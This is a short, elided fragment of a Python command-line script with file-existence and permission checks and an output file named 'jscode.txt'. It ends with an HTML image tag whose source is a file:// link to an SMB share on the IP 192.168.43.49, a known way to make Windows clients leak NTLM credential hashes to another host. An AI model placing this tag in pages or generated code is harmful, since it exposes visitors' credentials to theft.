...
def arg(outputscr):
    ...
    if check_file_exist:
        if check_write_permission:
            ...
            print()
            print(f"\t[{error}!{style.RESET}]{white}Unfortunately, you don't have any permissions for this file.!")
            print()
            sys.exit(0)
    else:
        print()
        print(f"\t[{error}!{style.RESET}]{white}File not found{error}!{style.RESET}")
        print()
        sys.exit(0)
#
if __name__ == '__main__':
    outputscr = "jscode.txt"
    try:
...
<img src="file://192.168.43.49/smb" />
